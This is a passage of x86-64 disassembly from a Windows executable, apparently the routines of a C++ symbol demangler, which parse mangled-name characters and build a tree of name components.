   14000445c:	ba 5f 00 00 00       	mov    $0x5f,%edx
   140004461:	48 89 d9             	mov    %rbx,%rcx
   140004464:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140004469:	e8 32 02 00 00       	call   0x1400046a0
   14000446e:	48 89 d9             	mov    %rbx,%rcx
   140004471:	48 89 c6             	mov    %rax,%rsi
   140004474:	e8 b7 e1 ff ff       	call   0x140002630
   140004479:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   14000447e:	49 89 c0             	mov    %rax,%r8
   140004481:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004485:	0f b6 10             	movzbl (%rax),%edx
   140004488:	80 fa 45             	cmp    $0x45,%dl
   14000448b:	0f 84 f2 01 00 00    	je     0x140004683
   140004491:	80 fa 70             	cmp    $0x70,%dl
   140004494:	0f 84 ae 01 00 00    	je     0x140004648
   14000449a:	80 fa 69             	cmp    $0x69,%dl
   14000449d:	0f 85 85 fc ff ff    	jne    0x140004128
   1400044a3:	80 78 01 6c          	cmpb   $0x6c,0x1(%rax)
   1400044a7:	0f 85 7b fc ff ff    	jne    0x140004128
   1400044ad:	48 89 d9             	mov    %rbx,%rcx
   1400044b0:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   1400044b5:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   1400044ba:	e8 c1 f8 ff ff       	call   0x140003d80
   1400044bf:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
   1400044c4:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   1400044c9:	49 89 c1             	mov    %rax,%r9
   1400044cc:	e9 fa fe ff ff       	jmp    0x1400043cb
   1400044d1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400044d8:	83 f8 64             	cmp    $0x64,%eax
   1400044db:	0f 85 d0 00 00 00    	jne    0x1400045b1
   1400044e1:	41 80 79 01 74       	cmpb   $0x74,0x1(%r9)
   1400044e6:	0f 85 c5 00 00 00    	jne    0x1400045b1
   1400044ec:	41 80 79 02 00       	cmpb   $0x0,0x2(%r9)
   1400044f1:	0f 85 ba 00 00 00    	jne    0x1400045b1
   1400044f7:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400044fb:	0f b6 10             	movzbl (%rax),%edx
   1400044fe:	80 fa 67             	cmp    $0x67,%dl
   140004501:	0f 84 ff 00 00 00    	je     0x140004606
   140004507:	80 fa 73             	cmp    $0x73,%dl
   14000450a:	75 0a                	jne    0x140004516
   14000450c:	80 78 01 72          	cmpb   $0x72,0x1(%rax)
   140004510:	0f 84 b2 00 00 00    	je     0x1400045c8
   140004516:	45 31 c0             	xor    %r8d,%r8d
   140004519:	31 d2                	xor    %edx,%edx
   14000451b:	48 89 d9             	mov    %rbx,%rcx
   14000451e:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140004523:	e8 f8 f1 ff ff       	call   0x140003720
   140004528:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   14000452d:	49 89 c0             	mov    %rax,%r8
   140004530:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004534:	80 38 49             	cmpb   $0x49,(%rax)
   140004537:	0f 85 1b fd ff ff    	jne    0x140004258
   14000453d:	48 83 c0 01          	add    $0x1,%rax
   140004541:	48 89 d9             	mov    %rbx,%rcx
   140004544:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   140004549:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000454d:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140004552:	e8 29 04 00 00       	call   0x140004980
   140004557:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   14000455c:	ba 04 00 00 00       	mov    $0x4,%edx
   140004561:	48 89 d9             	mov    %rbx,%rcx
   140004564:	49 89 c1             	mov    %rax,%r9
   140004567:	e8 d4 cf ff ff       	call   0x140001540
   14000456c:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
   140004571:	49 89 c0             	mov    %rax,%r8
   140004574:	e9 df fc ff ff       	jmp    0x140004258
   140004579:	8d 4a 8e             	lea    -0x72(%rdx),%ecx
   14000457c:	80 f9 01             	cmp    $0x1,%cl
   14000457f:	76 0c                	jbe    0x14000458d
   140004581:	8d 4a 9d             	lea    -0x63(%rdx),%ecx
   140004584:	80 f9 01             	cmp    $0x1,%cl
   140004587:	0f 87 42 fc ff ff    	ja     0x1400041cf
   14000458d:	48 89 d9             	mov    %rbx,%rcx
   140004590:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   140004595:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000459a:	e8 91 e0 ff ff       	call   0x140002630
   14000459f:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   1400045a4:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
   1400045a9:	48 89 c6             	mov    %rax,%rsi
   1400045ac:	e9 6a fc ff ff       	jmp    0x14000421b
   1400045b1:	83 f8 70             	cmp    $0x70,%eax
   1400045b4:	75 12                	jne    0x1400045c8
   1400045b6:	41 80 79 01 74       	cmpb   $0x74,0x1(%r9)
   1400045bb:	75 0b                	jne    0x1400045c8
   1400045bd:	41 80 79 02 00       	cmpb   $0x0,0x2(%r9)
   1400045c2:	0f 84 2f ff ff ff    	je     0x1400044f7
   1400045c8:	48 89 d9             	mov    %rbx,%rcx
   1400045cb:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   1400045d0:	e8 ab f7 ff ff       	call   0x140003d80
   1400045d5:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   1400045da:	49 89 c0             	mov    %rax,%r8
   1400045dd:	e9 76 fc ff ff       	jmp    0x140004258
   1400045e2:	48 89 d9             	mov    %rbx,%rcx
   1400045e5:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   1400045ea:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400045ef:	e8 8c f7 ff ff       	call   0x140003d80
   1400045f4:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
   1400045f9:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   1400045fe:	48 89 c6             	mov    %rax,%rsi
   140004601:	e9 15 fc ff ff       	jmp    0x14000421b
   140004606:	80 78 01 73          	cmpb   $0x73,0x1(%rax)
   14000460a:	0f 85 06 ff ff ff    	jne    0x140004516
   140004610:	eb b6                	jmp    0x1400045c8
   140004612:	48 89 d9             	mov    %rbx,%rcx
   140004615:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   14000461a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000461f:	e8 2c ef ff ff       	call   0x140003550
   140004624:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   140004629:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
   14000462e:	48 89 c6             	mov    %rax,%rsi
   140004631:	e9 e5 fb ff ff       	jmp    0x14000421b
   140004636:	48 89 d9             	mov    %rbx,%rcx
   140004639:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   14000463e:	e8 0d ef ff ff       	call   0x140003550
   140004643:	e9 55 fd ff ff       	jmp    0x14000439d
   140004648:	80 78 01 69          	cmpb   $0x69,0x1(%rax)
   14000464c:	0f 85 d6 fa ff ff    	jne    0x140004128
   140004652:	48 83 c0 02          	add    $0x2,%rax
   140004656:	ba 45 00 00 00       	mov    $0x45,%edx
   14000465b:	48 89 d9             	mov    %rbx,%rcx
   14000465e:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   140004663:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140004667:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   14000466c:	e8 2f 00 00 00       	call   0x1400046a0
   140004671:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140004676:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
   14000467b:	49 89 c1             	mov    %rax,%r9
   14000467e:	e9 48 fd ff ff       	jmp    0x1400043cb
   140004683:	48 83 c0 01          	add    $0x1,%rax
   140004687:	45 31 c9             	xor    %r9d,%r9d
   14000468a:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000468e:	e9 38 fd ff ff       	jmp    0x1400043cb
   140004693:	66 90                	xchg   %ax,%ax
   140004695:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000469c:	00 00 00 00 
   1400046a0:	55                   	push   %rbp
   1400046a1:	57                   	push   %rdi
   1400046a2:	56                   	push   %rsi
   1400046a3:	53                   	push   %rbx
   1400046a4:	48 83 ec 38          	sub    $0x38,%rsp
   1400046a8:	48 8b 41 18          	mov    0x18(%rcx),%rax
   1400046ac:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   1400046b3:	00 00 
   1400046b5:	48 89 cb             	mov    %rcx,%rbx
   1400046b8:	89 d5                	mov    %edx,%ebp
   1400046ba:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
   1400046bf:	38 10                	cmp    %dl,(%rax)
   1400046c1:	75 2a                	jne    0x1400046ed
   1400046c3:	eb 6b                	jmp    0x140004730
   1400046c5:	0f 1f 00             	nopl   (%rax)
   1400046c8:	45 31 c9             	xor    %r9d,%r9d
   1400046cb:	ba 2f 00 00 00       	mov    $0x2f,%edx
   1400046d0:	48 89 d9             	mov    %rbx,%rcx
   1400046d3:	e8 68 ce ff ff       	call   0x140001540
   1400046d8:	48 89 06             	mov    %rax,(%rsi)
   1400046db:	48 85 c0             	test   %rax,%rax
   1400046de:	74 2a                	je     0x14000470a
   1400046e0:	48 8d 70 18          	lea    0x18(%rax),%rsi
   1400046e4:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400046e8:	40 38 28             	cmp    %bpl,(%rax)
   1400046eb:	74 2b                	je     0x140004718
   1400046ed:	8b 7b 4c             	mov    0x4c(%rbx),%edi
   1400046f0:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   1400046f7:	48 89 d9             	mov    %rbx,%rcx
   1400046fa:	e8 81 f6 ff ff       	call   0x140003d80
   1400046ff:	89 7b 4c             	mov    %edi,0x4c(%rbx)
   140004702:	49 89 c0             	mov    %rax,%r8
   140004705:	48 85 c0             	test   %rax,%rax
   140004708:	75 be                	jne    0x1400046c8
   14000470a:	31 c0                	xor    %eax,%eax
   14000470c:	48 83 c4 38          	add    $0x38,%rsp
   140004710:	5b                   	pop    %rbx
   140004711:	5e                   	pop    %rsi
   140004712:	5f                   	pop    %rdi
   140004713:	5d                   	pop    %rbp
   140004714:	c3                   	ret
   140004715:	0f 1f 00             	nopl   (%rax)
   140004718:	48 83 c0 01          	add    $0x1,%rax
   14000471c:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140004720:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140004725:	48 83 c4 38          	add    $0x38,%rsp
   140004729:	5b                   	pop    %rbx
   14000472a:	5e                   	pop    %rsi
   14000472b:	5f                   	pop    %rdi
   14000472c:	5d                   	pop    %rbp
   14000472d:	c3                   	ret
   14000472e:	66 90                	xchg   %ax,%ax
   140004730:	48 83 c0 01          	add    $0x1,%rax
   140004734:	45 31 c9             	xor    %r9d,%r9d
   140004737:	45 31 c0             	xor    %r8d,%r8d
   14000473a:	ba 2f 00 00 00       	mov    $0x2f,%edx
   14000473f:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140004743:	48 83 c4 38          	add    $0x38,%rsp
   140004747:	5b                   	pop    %rbx
   140004748:	5e                   	pop    %rsi
   140004749:	5f                   	pop    %rdi
   14000474a:	5d                   	pop    %rbp
   14000474b:	e9 f0 cd ff ff       	jmp    0x140001540
   140004750:	41 56                	push   %r14
   140004752:	41 55                	push   %r13
   140004754:	41 54                	push   %r12
   140004756:	55                   	push   %rbp
   140004757:	57                   	push   %rdi
   140004758:	56                   	push   %rsi
   140004759:	53                   	push   %rbx
   14000475a:	48 83 ec 30          	sub    $0x30,%rsp
   14000475e:	45 89 c6             	mov    %r8d,%r14d
   140004761:	48 89 cb             	mov    %rcx,%rbx
   140004764:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140004768:	48 89 d7             	mov    %rdx,%rdi
   14000476b:	44 89 f0             	mov    %r14d,%eax
   14000476e:	48 89 d6             	mov    %rdx,%rsi
   140004771:	83 e0 01             	and    $0x1,%eax
   140004774:	44 0f b6 01          	movzbl (%rcx),%r8d
   140004778:	3c 01                	cmp    $0x1,%al
   14000477a:	45 19 ed             	sbb    %r13d,%r13d
   14000477d:	41 83 e5 fd          	and    $0xfffffffd,%r13d
   140004781:	41 83 c5 1e          	add    $0x1e,%r13d
   140004785:	3c 01                	cmp    $0x1,%al
   140004787:	45 19 e4             	sbb    %r12d,%r12d
   14000478a:	41 83 e4 fd          	and    $0xfffffffd,%r12d
   14000478e:	41 83 c4 1d          	add    $0x1d,%r12d
   140004792:	3c 01                	cmp    $0x1,%al
   140004794:	19 ed                	sbb    %ebp,%ebp
   140004796:	83 e5 fd             	and    $0xfffffffd,%ebp
   140004799:	83 c5 1c             	add    $0x1c,%ebp
   14000479c:	eb 71                	jmp    0x14000480f
   14000479e:	66 90                	xchg   %ax,%ax
   1400047a0:	41 80 f8 56          	cmp    $0x56,%r8b
   1400047a4:	0f 84 96 00 00 00    	je     0x140004840
   1400047aa:	41 80 f8 4b          	cmp    $0x4b,%r8b
   1400047ae:	0f 84 e4 00 00 00    	je     0x140004898
   1400047b4:	80 79 01 00          	cmpb   $0x0,0x1(%rcx)
   1400047b8:	0f 84 c2 00 00 00    	je     0x140004880
   1400047be:	48 8d 41 02          	lea    0x2(%rcx),%rax
   1400047c2:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400047c6:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   1400047ca:	3c 78                	cmp    $0x78,%al
   1400047cc:	0f 84 de 00 00 00    	je     0x1400048b0
   1400047d2:	89 c2                	mov    %eax,%edx
   1400047d4:	83 e2 df             	and    $0xffffffdf,%edx
   1400047d7:	80 fa 4f             	cmp    $0x4f,%dl
   1400047da:	0f 85 58 01 00 00    	jne    0x140004938
   1400047e0:	83 43 48 09          	addl   $0x9,0x48(%rbx)
   1400047e4:	45 31 c9             	xor    %r9d,%r9d
   1400047e7:	ba 52 00 00 00       	mov    $0x52,%edx
   1400047ec:	3c 4f                	cmp    $0x4f,%al
   1400047ee:	74 60                	je     0x140004850
   1400047f0:	45 31 c0             	xor    %r8d,%r8d
   1400047f3:	48 89 d9             	mov    %rbx,%rcx
   1400047f6:	e8 45 cd ff ff       	call   0x140001540
   1400047fb:	48 89 06             	mov    %rax,(%rsi)
   1400047fe:	48 85 c0             	test   %rax,%rax
   140004801:	74 7d                	je     0x140004880
   140004803:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140004807:	48 8d 70 10          	lea    0x10(%rax),%rsi
   14000480b:	44 0f b6 01          	movzbl (%rcx),%r8d
   14000480f:	e8 6c d3 ff ff       	call   0x140001b80
   140004814:	85 c0                	test   %eax,%eax
   140004816:	0f 84 cc 00 00 00    	je     0x1400048e8
   14000481c:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140004820:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140004824:	41 80 f8 72          	cmp    $0x72,%r8b
   140004828:	0f 85 72 ff ff ff    	jne    0x1400047a0
   14000482e:	83 43 48 09          	addl   $0x9,0x48(%rbx)
   140004832:	89 ea                	mov    %ebp,%edx
   140004834:	45 31 c9             	xor    %r9d,%r9d
   140004837:	eb b7                	jmp    0x1400047f0
   140004839:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004840:	83 43 48 09          	addl   $0x9,0x48(%rbx)
   140004844:	44 89 e2             	mov    %r12d,%edx
   140004847:	45 31 c9             	xor    %r9d,%r9d
   14000484a:	eb a4                	jmp    0x1400047f0
   14000484c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004850:	8b 53 4c             	mov    0x4c(%rbx),%edx
   140004853:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   14000485a:	48 89 d9             	mov    %rbx,%rcx
   14000485d:	89 54 24 2c          	mov    %edx,0x2c(%rsp)
   140004861:	e8 1a f5 ff ff       	call   0x140003d80
   140004866:	8b 54 24 2c          	mov    0x2c(%rsp),%edx
   14000486a:	49 89 c1             	mov    %rax,%r9
   14000486d:	89 53 4c             	mov    %edx,0x4c(%rbx)
   140004870:	48 85 c0             	test   %rax,%rax
   140004873:	75 53                	jne    0x1400048c8
   140004875:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000487c:	00 00 00 00 
   140004880:	31 f6                	xor    %esi,%esi
   140004882:	48 89 f0             	mov    %rsi,%rax
   140004885:	48 83 c4 30          	add    $0x30,%rsp
   140004889:	5b                   	pop    %rbx
   14000488a:	5e                   	pop    %rsi
   14000488b:	5f                   	pop    %rdi
   14000488c:	5d                   	pop    %rbp
   14000488d:	41 5c                	pop    %r12
   14000488f:	41 5d                	pop    %r13
   140004891:	41 5e                	pop    %r14
   140004893:	c3                   	ret
   140004894:	0f 1f 40 00          	nopl   0x0(%rax)
   140004898:	83 43 48 06          	addl   $0x6,0x48(%rbx)
   14000489c:	44 89 ea             	mov    %r13d,%edx
   14000489f:	45 31 c9             	xor    %r9d,%r9d
   1400048a2:	e9 49 ff ff ff       	jmp    0x1400047f0
   1400048a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400048ae:	00 00 
   1400048b0:	83 43 48 11          	addl   $0x11,0x48(%rbx)
   1400048b4:	45 31 c9             	xor    %r9d,%r9d
   1400048b7:	ba 4f 00 00 00       	mov    $0x4f,%edx
   1400048bc:	e9 2f ff ff ff       	jmp    0x1400047f0
   1400048c1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400048c8:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400048cc:	80 38 45             	cmpb   $0x45,(%rax)
   1400048cf:	75 af                	jne    0x140004880
   1400048d1:	48 83 c0 01          	add    $0x1,%rax
   1400048d5:	ba 52 00 00 00       	mov    $0x52,%edx
   1400048da:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400048de:	e9 0d ff ff ff       	jmp    0x1400047f0
   1400048e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400048e8:	41 83 e6 01          	and    $0x1,%r14d
   1400048ec:	75 94                	jne    0x140004882
   1400048ee:	41 80 f8 46          	cmp    $0x46,%r8b
   1400048f2:	74 20                	je     0x140004914
   1400048f4:	eb 8c                	jmp    0x140004882
   1400048f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400048fd:	00 00 00 
   140004900:	83 f8 1b             	cmp    $0x1b,%eax
   140004903:	74 2b                	je     0x140004930
   140004905:	83 f8 19             	cmp    $0x19,%eax
   140004908:	75 06                	jne    0x140004910
   14000490a:	c7 07 1c 00 00 00    	movl   $0x1c,(%rdi)
   140004910:	48 83 c7 10          	add    $0x10,%rdi
   140004914:	48 39 fe             	cmp    %rdi,%rsi
   140004917:	0f 84 65 ff ff ff    	je     0x140004882
   14000491d:	48 8b 3f             	mov    (%rdi),%rdi
   140004920:	8b 07                	mov    (%rdi),%eax
   140004922:	83 f8 1a             	cmp    $0x1a,%eax
   140004925:	75 d9                	jne    0x140004900
   140004927:	c7 07 1d 00 00 00    	movl   $0x1d,(%rdi)
   14000492d:	eb e1                	jmp    0x140004910
   14000492f:	90                   	nop
   140004930:	c7 07 1e 00 00 00    	movl   $0x1e,(%rdi)
   140004936:	eb d8                	jmp    0x140004910
   140004938:	3c 77                	cmp    $0x77,%al
   14000493a:	0f 85 40 ff ff ff    	jne    0x140004880
   140004940:	83 43 48 06          	addl   $0x6,0x48(%rbx)
   140004944:	48 89 d9             	mov    %rbx,%rcx
   140004947:	e8 24 e8 ff ff       	call   0x140003170
   14000494c:	49 89 c1             	mov    %rax,%r9
   14000494f:	48 85 c0             	test   %rax,%rax
   140004952:	0f 84 28 ff ff ff    	je     0x140004880
   140004958:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000495c:	80 38 45             	cmpb   $0x45,(%rax)
   14000495f:	0f 85 1b ff ff ff    	jne    0x140004880
   140004965:	48 83 c0 01          	add    $0x1,%rax
   140004969:	ba 53 00 00 00       	mov    $0x53,%edx
   14000496e:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140004972:	e9 79 fe ff ff       	jmp    0x1400047f0
   140004977:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000497e:	00 00 
   140004980:	57                   	push   %rdi
   140004981:	56                   	push   %rsi
   140004982:	53                   	push   %rbx
   140004983:	48 83 ec 40          	sub    $0x40,%rsp
   140004987:	48 8b 41 18          	mov    0x18(%rcx),%rax
   14000498b:	48 89 cb             	mov    %rcx,%rbx
   14000498e:	80 38 45             	cmpb   $0x45,(%rax)
   140004991:	0f 84 89 00 00 00    	je     0x140004a20
   140004997:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000499e:	00 00 
   1400049a0:	48 8b 79 40          	mov    0x40(%rcx),%rdi
   1400049a4:	48 8d 74 24 38       	lea    0x38(%rsp),%rsi
   1400049a9:	eb 30                	jmp    0x1400049db
   1400049ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400049b0:	45 31 c9             	xor    %r9d,%r9d
   1400049b3:	ba 30 00 00 00       	mov    $0x30,%edx
   1400049b8:	48 89 d9             	mov    %rbx,%rcx
   1400049bb:	e8 80 cb ff ff       	call   0x140001540
   1400049c0:	48 89 06             	mov    %rax,(%rsi)
   1400049c3:	48 85 c0             	test   %rax,%rax
   1400049c6:	74 23                	je     0x1400049eb
   1400049c8:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   1400049cc:	48 8d 70 18          	lea    0x18(%rax),%rsi
   1400049d0:	0f b6 02             	movzbl (%rdx),%eax
   1400049d3:	3c 45                	cmp    $0x45,%al
   1400049d5:	74 29                	je     0x140004a00
   1400049d7:	3c 51                	cmp    $0x51,%al
   1400049d9:	74 25                	je     0x140004a00
   1400049db:	48 89 d9             	mov    %rbx,%rcx
   1400049de:	e8 3d 12 00 00       	call   0x140005c20
   1400049e3:	49 89 c0             	mov    %rax,%r8
   1400049e6:	48 85 c0             	test   %rax,%rax
   1400049e9:	75 c5                	jne    0x1400049b0
   1400049eb:	31 f6                	xor    %esi,%esi
   1400049ed:	48 89 f0             	mov    %rsi,%rax
   1400049f0:	48 83 c4 40          	add    $0x40,%rsp
   1400049f4:	5b                   	pop    %rbx
   1400049f5:	5e                   	pop    %rsi
   1400049f6:	5f                   	pop    %rdi
   1400049f7:	c3                   	ret
   1400049f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400049ff:	00 
   140004a00:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004a05:	3c 51                	cmp    $0x51,%al
   140004a07:	74 36                	je     0x140004a3f
   140004a09:	48 83 c2 01          	add    $0x1,%rdx
   140004a0d:	48 89 f0             	mov    %rsi,%rax
   140004a10:	48 89 7b 40          	mov    %rdi,0x40(%rbx)
   140004a14:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140004a18:	48 83 c4 40          	add    $0x40,%rsp
   140004a1c:	5b                   	pop    %rbx
   140004a1d:	5e                   	pop    %rsi
   140004a1e:	5f                   	pop    %rdi
   140004a1f:	c3                   	ret
   140004a20:	48 83 c0 01          	add    $0x1,%rax
   140004a24:	45 31 c9             	xor    %r9d,%r9d
   140004a27:	45 31 c0             	xor    %r8d,%r8d
   140004a2a:	ba 30 00 00 00       	mov    $0x30,%edx
   140004a2f:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140004a33:	48 83 c4 40          	add    $0x40,%rsp
   140004a37:	5b                   	pop    %rbx
   140004a38:	5e                   	pop    %rsi
   140004a39:	5f                   	pop    %rdi
   140004a3a:	e9 01 cb ff ff       	jmp    0x140001540
   140004a3f:	48 83 c2 01          	add    $0x1,%rdx
   140004a43:	48 89 d9             	mov    %rbx,%rcx
   140004a46:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140004a4a:	8b 53 4c             	mov    0x4c(%rbx),%edx
   140004a4d:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   140004a54:	89 54 24 2c          	mov    %edx,0x2c(%rsp)
   140004a58:	e8 23 f3 ff ff       	call   0x140003d80
   140004a5d:	8b 54 24 2c          	mov    0x2c(%rsp),%edx
   140004a61:	89 53 4c             	mov    %edx,0x4c(%rbx)
   140004a64:	48 85 c0             	test   %rax,%rax
   140004a67:	74 13                	je     0x140004a7c
   140004a69:	49 89 c1             	mov    %rax,%r9
   140004a6c:	49 89 f0             	mov    %rsi,%r8
   140004a6f:	ba 5e 00 00 00       	mov    $0x5e,%edx
   140004a74:	48 89 d9             	mov    %rbx,%rcx
   140004a77:	e8 c4 ca ff ff       	call   0x140001540
   140004a7c:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140004a80:	80 3a 45             	cmpb   $0x45,(%rdx)
   140004a83:	0f 85 62 ff ff ff    	jne    0x1400049eb
   140004a89:	48 89 c6             	mov    %rax,%rsi
   140004a8c:	e9 78 ff ff ff       	jmp    0x140004a09
   140004a91:	0f 1f 40 00          	nopl   0x0(%rax)
   140004a95:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004a9c:	00 00 00 00 
   140004aa0:	57                   	push   %rdi
   140004aa1:	56                   	push   %rsi
   140004aa2:	53                   	push   %rbx
   140004aa3:	48 83 ec 20          	sub    $0x20,%rsp
   140004aa7:	31 f6                	xor    %esi,%esi
   140004aa9:	48 89 cb             	mov    %rcx,%rbx
   140004aac:	89 d7                	mov    %edx,%edi
   140004aae:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140004ab2:	0f b6 11             	movzbl (%rcx),%edx
   140004ab5:	80 fa 44             	cmp    $0x44,%dl
   140004ab8:	0f 84 d2 00 00 00    	je     0x140004b90
   140004abe:	80 fa 49             	cmp    $0x49,%dl
   140004ac1:	0f 84 09 01 00 00    	je     0x140004bd0
   140004ac7:	80 fa 54             	cmp    $0x54,%dl
   140004aca:	75 74                	jne    0x140004b40
   140004acc:	48 85 f6             	test   %rsi,%rsi
   140004acf:	0f 85 0b 01 00 00    	jne    0x140004be0
   140004ad5:	48 89 d9             	mov    %rbx,%rcx
   140004ad8:	e8 b3 d3 ff ff       	call   0x140001e90
   140004add:	48 89 c6             	mov    %rax,%rsi
   140004ae0:	48 85 f6             	test   %rsi,%rsi
   140004ae3:	0f 84 f7 00 00 00    	je     0x140004be0
   140004ae9:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140004aed:	80 39 45             	cmpb   $0x45,(%rcx)
   140004af0:	0f 84 ec 00 00 00    	je     0x140004be2
   140004af6:	85 ff                	test   %edi,%edi
   140004af8:	0f 85 b2 00 00 00    	jne    0x140004bb0
   140004afe:	0f b6 11             	movzbl (%rcx),%edx
   140004b01:	80 fa 44             	cmp    $0x44,%dl
   140004b04:	0f 84 86 00 00 00    	je     0x140004b90
   140004b0a:	80 fa 49             	cmp    $0x49,%dl
   140004b0d:	75 b8                	jne    0x140004ac7
   140004b0f:	48 83 c1 01          	add    $0x1,%rcx
   140004b13:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   140004b17:	48 89 d9             	mov    %rbx,%rcx
   140004b1a:	e8 61 fe ff ff       	call   0x140004980
   140004b1f:	49 89 c1             	mov    %rax,%r9
   140004b22:	48 85 c0             	test   %rax,%rax
   140004b25:	0f 84 b5 00 00 00    	je     0x140004be0
   140004b2b:	49 89 f0             	mov    %rsi,%r8
   140004b2e:	ba 04 00 00 00       	mov    $0x4,%edx
   140004b33:	48 89 d9             	mov    %rbx,%rcx
   140004b36:	e8 05 ca ff ff       	call   0x140001540
   140004b3b:	48 89 c6             	mov    %rax,%rsi
   140004b3e:	eb a0                	jmp    0x140004ae0
   140004b40:	80 fa 4d             	cmp    $0x4d,%dl
   140004b43:	0f 84 c7 00 00 00    	je     0x140004c10
   140004b49:	80 fa 53             	cmp    $0x53,%dl
   140004b4c:	0f 85 9e 00 00 00    	jne    0x140004bf0
   140004b52:	ba 01 00 00 00       	mov    $0x1,%edx
   140004b57:	48 89 d9             	mov    %rbx,%rcx
   140004b5a:	e8 b1 d7 ff ff       	call   0x140002310
   140004b5f:	49 89 c0             	mov    %rax,%r8
   140004b62:	48 85 c0             	test   %rax,%rax
   140004b65:	74 79                	je     0x140004be0
   140004b67:	8b 00                	mov    (%rax),%eax
   140004b69:	83 e8 55             	sub    $0x55,%eax
   140004b6c:	83 f8 01             	cmp    $0x1,%eax
   140004b6f:	0f 86 7e 00 00 00    	jbe    0x140004bf3
   140004b75:	48 85 f6             	test   %rsi,%rsi
   140004b78:	75 66                	jne    0x140004be0
   140004b7a:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140004b7e:	4c 89 c6             	mov    %r8,%rsi
   140004b81:	0f b6 11             	movzbl (%rcx),%edx
   140004b84:	80 fa 44             	cmp    $0x44,%dl
   140004b87:	75 81                	jne    0x140004b0a
   140004b89:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004b90:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   140004b94:	83 e0 df             	and    $0xffffffdf,%eax
   140004b97:	3c 54                	cmp    $0x54,%al
   140004b99:	75 55                	jne    0x140004bf0
   140004b9b:	48 85 f6             	test   %rsi,%rsi
   140004b9e:	75 40                	jne    0x140004be0
   140004ba0:	48 89 d9             	mov    %rbx,%rcx
   140004ba3:	e8 88 da ff ff       	call   0x140002630
   140004ba8:	48 89 c6             	mov    %rax,%rsi
